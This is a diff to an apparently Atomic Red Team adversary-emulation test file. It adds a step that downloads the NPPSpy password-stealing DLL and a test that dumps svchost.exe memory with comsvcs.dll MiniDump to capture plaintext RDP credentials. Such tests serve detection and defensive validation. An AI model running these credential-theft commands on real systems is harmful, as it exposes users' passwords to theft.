@@ -61,6 +61,7 @@ atomic_tests:
   - description: NPPSpy.dll must be available in local temp directory 
     prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit 1}
     get_prereq_command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"
   executor:
     command: |-
@@ -84,3 +85,23 @@ atomic_tests:
       Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore
     name: powershell
     elevation_required: true
+    
+- name: Dump svchost.exe to gather RDP credentials
+  auto_generated_guid: d400090a-d8ca-4be0-982e-c70598a23de9
+  description: |
+    The svchost.exe contains the RDP plain-text credentials.
+    Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+    
+    Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+      if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+    cleanup_command: |
+      Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
